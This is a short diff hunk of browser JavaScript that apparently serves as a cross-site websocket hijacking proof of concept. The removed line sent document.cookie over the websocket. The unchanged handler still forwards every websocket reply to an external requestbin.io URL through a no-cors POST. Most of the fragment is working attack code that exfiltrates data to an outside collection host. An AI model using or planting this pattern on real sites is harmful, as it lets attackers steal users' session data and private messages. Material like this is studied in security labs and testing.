@@ -6,7 +6,7 @@
     websocket.onopen = start
     websocket.onmessage = handleReply
     function start(event) {
-      websocket.send(document.cookie);
+      websocket.send('asd');
     }
     function handleReply(event) {
       fetch('https://requestbin.io/1fetb1q1', {method:'POST',mode:'no-cors',body:event.data})
